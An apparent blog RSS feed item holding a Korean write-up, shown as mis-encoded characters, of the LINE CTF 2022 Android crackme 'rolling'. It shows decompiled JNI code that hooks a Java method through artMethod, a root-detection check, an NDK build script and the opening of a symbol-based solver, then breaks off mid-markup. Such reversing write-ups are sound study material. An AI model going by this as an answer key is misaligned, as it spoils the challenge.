<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JUHYUN167</title>
    <link>https://juhyun167.github.io/</link>
    
    <atom:link href="https://juhyun167.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description></description>
    <pubDate>Mon, 29 Aug 2022 14:50:03 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[LINE CTF 2022] rolling</title>
      <link>https://juhyun167.github.io/2022/08/28/line22-rolling/</link>
      <guid>https://juhyun167.github.io/2022/08/28/line22-rolling/</guid>
      <pubDate>Sun, 28 Aug 2022 22:14:25 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;what you know about rolling?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;/uploads/line22</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h1><blockquote><p>what you know about rolling?</p></blockquote><p><a href="/uploads/line22-rolling/rolling.apk">rolling.apk</a></p><h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">ë¬¸ì œ ë¶„ì„</h2><blockquote class="callout-warning">    <p>    <strong>ì£¼ì˜ì‚¬í•­</strong><br>    ì´ ê¸€ì˜ ë‚´ìš©ì„ ë”°ë¼í•˜ê¸° ìœ„í•´ì„œëŠ” Aarch64 ì•„í‚¤í…ì²˜ ê¸°ë°˜ì˜ ì•ˆë“œë¡œì´ë“œ ì¥ì¹˜ê°€ í•„ìš”í•©ë‹ˆë‹¤.     </p></blockquote><p>ì•ˆë“œë¡œì´ë“œ APK íŒŒì¼ <code>rolling.apk</code> ê°€ ì£¼ì–´ì§‘ë‹ˆë‹¤. ADBë¥¼ ì´ìš©í•˜ì—¬ ì•ˆë“œë¡œì´ë“œ ì¥ì¹˜ì— ì„¤ì¹˜í•œ í›„ ì‹¤í–‰í•˜ë©´ ê·¸ë¦¼ê³¼ ê°™ì´ <code>EditText</code> ìœ„ì ¯ê³¼ ë²„íŠ¼ì´ ìˆëŠ”ë°, ì•„ë¬´ í…ìŠ¤íŠ¸ë‚˜ ì…ë ¥í•˜ê³  ë²„íŠ¼ì„ ëˆ„ë¥´ë©´ ì•±ì´ ê°•ì œì¢…ë£Œë©ë‹ˆë‹¤.</p><p><img src="/images/line22-rolling/1.png" alt="1.png"></p><p>ëŸ°ì²˜ ì•¡í‹°ë¹„í‹°ì¸ <code>MainActivity</code> ì˜ ë””ì»´íŒŒì¼ ê²°ê³¼ë¥¼ ë³´ë©´ 10í–‰ì— <code>checkFlag</code> ë©”ì†Œë“œ, 19í–‰ì— <code>deep</code> ë„¤ì´í‹°ë¸Œ ë©”ì†Œë“œê°€ ì„ ì–¸ë˜ì–´ ìˆìŠµë‹ˆë‹¤. <code>checkFlag</code> ë©”ì†Œë“œëŠ” ìœ„ì˜ í™”ë©´ì—ì„œ ë²„íŠ¼ì„ ëˆ„ë¥´ë©´ í˜¸ì¶œë˜ëŠ” ë©”ì†Œë“œì…ë‹ˆë‹¤. ì´ ë©”ì†Œë“œëŠ” <code>EditText</code> ìœ„ì ¯ì— íŠ¹ì • URLì„ ì…ë ¥í•˜ë©´ â€œCorrect! ğŸ˜ƒâ€ ë¬¸ìì—´ì„ ì¶œë ¥í•˜ëŠ”ë°, ê·¸ë ‡ë‹¤ê³  í”Œë˜ê·¸ë¥¼ ì£¼ëŠ” ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.linectf.app;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFlag</span><span class="params">(View arg6)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F08006D</span>)).getText().toString() == <span class="string">&quot;IINECFT&#123;youtube.com/watch?v=dQw4w9WgXcQ&#125;&quot;</span>) &#123;  <span class="comment">// id:editText</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Correct! :)&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(arg6.getContext(), <span class="string">&quot;Wrong! :(&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">deep</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.appcompat.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg2)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg2);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>APK íŒŒì¼ì—ì„œ <code>lib/arm64-v8a</code> ê²½ë¡œì—ëŠ” 64ë¹„íŠ¸ Aarch64 ë¼ì´ë¸ŒëŸ¬ë¦¬ì¸ <code>libnative-lib.so</code> íŒŒì¼ì´ ìˆìŠµë‹ˆë‹¤. ì•ˆë“œë¡œì´ë“œ ì•±ì€ JNI(Java Native Interface)ë¥¼ ì´ìš©í•´ Javaë¡œ ì‘ì„±ëœ ì•± ì½”ë“œì—ì„œ C/C++ë¡œ ì‘ì„±ëœ ë„¤ì´í‹°ë¸Œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¶ˆëŸ¬ì˜¤ê³  ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì€ ì•±ì—ì„œ ë¶ˆëŸ¬ì˜¤ëŠ” ë„¤ì´í‹°ë¸Œ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— í•´ë‹¹í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì•ì„œ <code>MainActivity</code> ì—ì„œ <code>System.loadLibrary</code> ë¥¼ í˜¸ì¶œí•˜ì—¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¶ˆëŸ¬ì˜¤ë©´ <code>JNI_OnLoad</code> í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ 7í–‰ì—ì„œ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>deep</code> í•¨ìˆ˜ë¥¼ ì•±ì—ì„œ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ë„¤ì´í‹°ë¸Œ ë©”ì†Œë“œë¡œ ë“±ë¡í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  (*vm)-&gt;GetEnv(vm, (<span class="type">void</span> **)&amp;env, <span class="number">65542LL</span>);</span><br><span class="line">  c = (*env)-&gt;FindClass(env, <span class="string">&quot;me/linectf/app/MainActivity&quot;</span>);</span><br><span class="line">  (*env)-&gt;GetObjectClass(env, c);</span><br><span class="line">  (*env)-&gt;RegisterNatives(env, c, methods, <span class="number">1LL</span>);<span class="comment">// JNINativeMethod methods[] = &#123;</span></span><br><span class="line">                                                <span class="comment">//     &quot;deep&quot;, &quot;()V&quot;, reintepret_cast&lt;void*&gt;(deep)</span></span><br><span class="line">                                                <span class="comment">// &#125;;</span></span><br><span class="line">  v3 = (*env)-&gt;GetMethodID(env, c, <span class="string">&quot;checkFlag&quot;</span>, <span class="string">&quot;(Landroid/view/View;)V&quot;</span>);</span><br><span class="line">  v4 = (*env)-&gt;GetMethodID(env, c, <span class="string">&quot;deep&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">  v5 = (*env)-&gt;ToReflectedMethod(env, c, v3, <span class="number">0LL</span>);</span><br><span class="line">  v6 = (*env)-&gt;ToReflectedMethod(env, c, v4, <span class="number">0LL</span>);</span><br><span class="line">  v7 = (*env)-&gt;FindClass(env, <span class="string">&quot;java/lang/reflect/Executable&quot;</span>);</span><br><span class="line">  v8 = (*env)-&gt;GetFieldID(env, v7, <span class="string">&quot;artMethod&quot;</span>, <span class="string">&quot;J&quot;</span>);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> <span class="type">int</span> *)(*env)-&gt;GetLongField(env, v5, v8);</span><br><span class="line">  v10 = (<span class="type">unsigned</span> <span class="type">int</span> *)(*env)-&gt;GetLongField(env, v6, v8);</span><br><span class="line">  v11 = *v9;</span><br><span class="line">  v12 = *v10;</span><br><span class="line">  *(_DWORD *)((<span class="type">char</span> *)&amp;qword_58 + v12) = *(_DWORD *)((<span class="type">char</span> *)&amp;qword_58 + v11);</span><br><span class="line">  *(_DWORD *)(v12 + <span class="number">120</span>) = *(_DWORD *)(v11 + <span class="number">120</span>);</span><br><span class="line">  *v9 = v12;</span><br><span class="line">  v9[<span class="number">1</span>] = v10[<span class="number">1</span>] | <span class="number">1</span>;</span><br><span class="line">  v9[<span class="number">2</span>] = v10[<span class="number">2</span>];</span><br><span class="line">  *((_WORD *)v9 + <span class="number">9</span>) = *((_WORD *)v10 + <span class="number">9</span>);</span><br><span class="line">  *(_OWORD *)(v9 + <span class="number">6</span>) = *(_OWORD *)(v10 + <span class="number">6</span>);</span><br><span class="line">  *((_QWORD *)v9 + <span class="number">5</span>) = *((_QWORD *)v10 + <span class="number">5</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65542</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê·¸ëŸ°ë° 10í–‰ ì´í›„ì˜ ì½”ë“œë¥¼ ë³´ë©´ <code>GetMethodID</code> , <code>ToReflectedMethod</code> ë“± JNI í•¨ìˆ˜ë“¤ì„ ì´ìš©í•œ ì¶”ê°€ì ì¸ ì‘ì—…ì„ í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ <code>ToReflectedMethod</code> í•¨ìˆ˜ëŠ” ì•ˆë“œë¡œì´ë“œ NDK <a href="https://github.com/android/ndk/wiki/JNI#jnienv">ìœ„í‚¤</a>ë¥¼ ë³´ë©´ Java ë¦¬í”Œë ‰ì…˜(reflection)ê³¼ì˜ ìƒí˜¸ì‘ìš©ì„ ìœ„í•œ í•¨ìˆ˜ë¼ê³  ëª…ì‹œë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë¦¬í”Œë ‰ì…˜ì€ ëŸ°íƒ€ì„ì— ê°ì²´ì˜ ë©¤ë²„ë“¤ì— ëŒ€í•œ ì •ë³´ë¥¼ ì¡°íšŒí•˜ê³  ì¡°ì‘í•  ìˆ˜ ìˆëŠ” Java ì–¸ì–´ì˜ ê¸°ëŠ¥ì…ë‹ˆë‹¤. ì´ë¥¼ ì°¸ê³ í•  ë•Œ, ë¦¬í”Œë ‰ì…˜ì„ ì´ìš©í•´ <code>checkFlag</code> ì˜ <code>artMethod</code> ê°’ì„ <code>deep</code> ì˜ ê°’ìœ¼ë¡œ ë®ì–´ì”Œì›Œ ëŸ°íƒ€ì„ì— <code>checkFlag</code> ë©”ì†Œë“œë¥¼ í˜¸ì¶œí•˜ë©´ <code>deep</code> ë„¤ì´í‹°ë¸Œ ë©”ì†Œë“œê°€ í˜¸ì¶œë˜ë„ë¡ ì¡°ì‘í•˜ê³  ìˆìŒì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ <code>deep</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ <code>MainActivity</code> ì˜ <code>EditText</code> ìœ„ì ¯ì— ì…ë ¥ëœ ë¬¸ìì—´ì„ ê°€ì ¸ì™€ ë°˜ë³µë¬¸ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ë°˜ë³µë¬¸ì€ ë¬¸ìì—´ ë‚´ì˜ ê° ë¬¸ì <code>s[i]</code> ì— ëŒ€í•´ <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ì—¬ ê²°ê³¼ê°€ ê°ê° <code>data[i]</code> , <code>data[i + 1]</code> , <code>data[i + 2]</code> ì™€ ëª¨ë‘ ê°™ì€ì§€ ê²€ì‚¬í•©ë‹ˆë‹¤. ëª¨ë“  ë¬¸ìì— ëŒ€í•´ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ë©´ â€œCorrect! ğŸ˜ƒâ€ ë¥¼ ì¶œë ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ ë§Œì¡±í•˜ëŠ” ë¬¸ìì—´ì´ í”Œë˜ê·¸ë¼ê³  ì§ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">deep</span><span class="params">(JNIEnv *env, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( (stat(<span class="string">&quot;/bin/su&quot;</span>, (<span class="keyword">struct</span> stat *)v51) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span></span><br><span class="line">      &amp;&amp; (stat(<span class="string">&quot;/bin/magisk&quot;</span>, (<span class="keyword">struct</span> stat *)v51) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v50 = v19;</span><br><span class="line">      v27 = (*env)-&gt;FindClass(env, <span class="string">&quot;me/linectf/app/R$id&quot;</span>);</span><br><span class="line">      v28 = (*env)-&gt;GetStaticFieldID(env, v27, <span class="string">&quot;editText&quot;</span>, <span class="string">&quot;I&quot;</span>);</span><br><span class="line">      (*env)-&gt;GetStaticIntField(env, v27, v28);</span><br><span class="line">      v29 = (*env)-&gt;FindClass(env, <span class="string">&quot;me/linectf/app/MainActivity&quot;</span>);</span><br><span class="line">      v30 = (*env)-&gt;GetMethodID(env, v29, <span class="string">&quot;findViewById&quot;</span>, <span class="string">&quot;(I)Landroid/view/View;&quot;</span>);</span><br><span class="line">      v31 = _JNIEnv::CallObjectMethod(env, a2, v30);</span><br><span class="line">      v32 = (*env)-&gt;FindClass(env, <span class="string">&quot;android/widget/EditText&quot;</span>);</span><br><span class="line">      v33 = (*env)-&gt;GetMethodID(env, v32, <span class="string">&quot;getText&quot;</span>, <span class="string">&quot;()Landroid/text/Editable;&quot;</span>);</span><br><span class="line">      v34 = _JNIEnv::CallObjectMethod(env, v31, v33);</span><br><span class="line">      v35 = (*env)-&gt;FindClass(env, <span class="string">&quot;android/text/Editable&quot;</span>);</span><br><span class="line">      v36 = (*env)-&gt;GetMethodID(env, v35, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>);</span><br><span class="line">      v37 = (<span class="type">void</span> *)_JNIEnv::CallObjectMethod(env, v34, v36);</span><br><span class="line">      s = (*env)-&gt;GetStringUTFChars(env, v37, <span class="number">0LL</span>);</span><br><span class="line">      j = <span class="number">0</span>;</span><br><span class="line">      i = <span class="number">0LL</span>;</span><br><span class="line">      failed = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>(s) &gt; i )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_3C48(buf, v42, v43, v44, (<span class="type">unsigned</span> __int8)s[i]);<span class="comment">// vsnprintf(buf, 2, &quot;%c&#x27;, s[i])</span></span><br><span class="line">        v45 = (<span class="type">unsigned</span> __int8 *)meatbox(buf);</span><br><span class="line">        v46 = (<span class="type">unsigned</span> __int8 *)soulbox(buf);</span><br><span class="line">        v47 = (<span class="type">unsigned</span> __int8 *)godbox(buf);</span><br><span class="line">        <span class="keyword">if</span> ( data[j] != *v45 || data[j + <span class="number">1</span>] != *v46 || data[j + <span class="number">2</span>] != *v47 )</span><br><span class="line">          failed = <span class="number">1</span>;</span><br><span class="line">        ++i;</span><br><span class="line">        j += <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( failed == <span class="number">1</span> || <span class="built_in">strlen</span>(s) &lt;= <span class="number">50uLL</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v48 = *env;</span><br><span class="line">        v49 = <span class="string">&quot;Wrong! :(&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v48 = *env;</span><br><span class="line">        v49 = <span class="string">&quot;Correct! :)&quot;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">ë¬¸ì œ í’€ì´</h2><p>í”Œë˜ê·¸ë¥¼ ì–»ê¸° ìœ„í•´ì„œëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ì— êµ¬í˜„ëœ <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬í–ˆì„ ë•Œ ê²°ê³¼ê°€ <code>data</code> ë°°ì—´ì˜ ê°’ë“¤ê³¼ ì¼ì¹˜í•˜ëŠ” ë¬¸ìì—´ì„ êµ¬í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ°ë° ì´ë“¤ í•¨ìˆ˜ì˜ êµ¬í˜„ì€ ë§¤ìš° ë³µì¡í•˜ì—¬ ë¶„ì„ì´ ì‰½ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¼ì´ë¸ŒëŸ¬ë¦¬ ë˜í•œ ì•ˆë“œë¡œì´ë“œ NDKë¡œ ì»´íŒŒì¼ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¡œ ì¼ë°˜ì ì¸ Aarch64 í™˜ê²½ì—ì„œ ë™ì  ë¶„ì„ì„ ì‹œë„í•˜ì—¬ë„ ì˜ì¡´ì„± ë¬¸ì œë¡œ ì¸í•´ ë¡œë”©ì¡°ì°¨ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë™ì ìœ¼ë¡œ ë¡œë”©í•˜ì—¬ <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” C ì½”ë“œë¥¼ ì‘ì„±í•˜ê³ , ì•ˆë“œë¡œì´ë“œ NDKë¡œ ì»´íŒŒì¼í•œ í›„ Aarch64 ê¸°ë°˜ì˜ ì•ˆë“œë¡œì´ë“œ ì¥ì¹˜ì—ì„œ ì‹¤í–‰í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.</p><p>ì•ˆë“œë¡œì´ë“œ NDKëŠ” C/C++ë¡œ ì‘ì„±í•œ ì½”ë“œë¥¼ ì•ˆë“œë¡œì´ë“œì—ì„œ ì‹¤í–‰ ê°€ëŠ¥í•˜ë„ë¡ í•˜ëŠ” ë¹Œë“œ ë„êµ¬ì…ë‹ˆë‹¤. ì•ˆë“œë¡œì´ë“œ í†µí•© ê°œë°œ í™˜ê²½ì¸ ì•ˆë“œë¡œì´ë“œ ìŠ¤íŠœë””ì˜¤(Android Studio)ì˜ SDK Manager ë©”ë‰´ì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/line22-rolling/2.png" alt="2.png"></p><p>ì•ˆë“œë¡œì´ë“œ NDK ì„¤ì¹˜ ê²½ë¡œì˜ clang ì»´íŒŒì¼ëŸ¬ë¥¼ ì´ìš©í•´ ì†ŒìŠ¤ ì½”ë“œë¥¼ ì»´íŒŒì¼í•˜ê³ , ADBë¥¼ ì´ìš©í•˜ì—¬ ë°”ì´ë„ˆë¦¬ë¥¼ ì¥ì¹˜ì— ì „ì†¡í•˜ëŠ” ë¹Œë“œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤. ì„¤ì¹˜ ê²½ë¡œëŠ” ìš´ì˜ì²´ì œì— ë”°ë¼ ì„œë¡œ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add to terminal PATH variable</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$HOME</span>/Library/Android/sdk/ndk/25.1.8937393/toolchains/llvm/prebuilt/darwin-x86_64/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make alias CC to be the new clang binary</span></span><br><span class="line"><span class="built_in">export</span> CC=aarch64-linux-android29-clang</span><br><span class="line"></span><br><span class="line"><span class="variable">$CC</span> main.c -o main</span><br><span class="line"></span><br><span class="line"><span class="comment"># push compiled binary to android</span></span><br><span class="line">adb push main /data/local/tmp</span><br></pre></td></tr></table></figure><p>ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•  ë•Œ ìœ ì˜í•  ì ì€ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” C++ë¡œ ì‘ì„±ë˜ì–´, í•¨ìˆ˜ ì´ë¦„ì´ ë§¹ê¸€ë§(mangling)ë˜ì–´ ìˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. <code>readelf</code> ë¥¼ ì‚¬ìš©í•´ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì‹¬ë³¼ì„ ì¡°íšŒí•˜ë©´ <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> í•¨ìˆ˜ë“¤ì˜ ë§¹ê¸€ë§ëœ ì´ë¦„ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•¨ìˆ˜ë¥¼ ë¶ˆëŸ¬ì˜¬ ë•ŒëŠ” ì´ ì´ë¦„ë“¤ì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s .\libnative-lib.so | grep &quot;box&quot;</span><br><span class="line">    ...</span><br><span class="line">    21: 0000000000001708  1040 FUNC    GLOBAL DEFAULT   10 _Z7meatboxPc</span><br><span class="line">    ...</span><br><span class="line">    28: 000000000000314c  1044 FUNC    GLOBAL DEFAULT   10 _Z6godboxPc</span><br><span class="line">    ...</span><br><span class="line">    35: 0000000000002428  1040 FUNC    GLOBAL DEFAULT   10 _Z7soulboxPc</span><br></pre></td></tr></table></figure><p>í’€ì´ ì½”ë“œëŠ” <code>dlopen</code> ê³¼ <code>dlsym</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ ë™ì ìœ¼ë¡œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¶ˆëŸ¬ì˜¤ê³  <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> í•¨ìˆ˜ë¥¼ ì°¾ì•„ í•¨ìˆ˜ í¬ì¸í„°ì— ëŒ€ì…í•©ë‹ˆë‹¤. ì´í›„ ëª¨ë“  ì¶œë ¥ ê°€ëŠ¥í•œ ASCII ë²”ìœ„ì˜ ë¬¸ìì— ëŒ€í•´ ê°ê°ì˜ í•¨ìˆ˜ë“¤ì„ í˜¸ì¶œí•˜ì—¬ ê²°ê³¼ë¥¼ ë¯¸ë¦¬ <code>map</code> ë°°ì—´ì— ì €ì¥í•©ë‹ˆë‹¤. <code>data</code> ë°°ì—´ì˜ ê°’ë“¤ê³¼ ê²°ê³¼ê°€ ì¼ì¹˜í•˜ëŠ” ë¬¸ìë¥¼ <code>map</code> ë°°ì—´ì—ì„œ ì¡°íšŒí•˜ì—¬ í”Œë˜ê·¸ë¥¼ êµ¬í•  ìˆ˜ë„ë¡ í•˜ì˜€ìŠµë‹ˆë‹¤. ì•ˆë“œë¡œì´ë“œ ì¥ì¹˜ì— ë°”ì´ë„ˆë¦¬ë¥¼ ì „ì†¡í•˜ê³  ì‹¤í–‰í•˜ë©´ í”Œë˜ê·¸ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 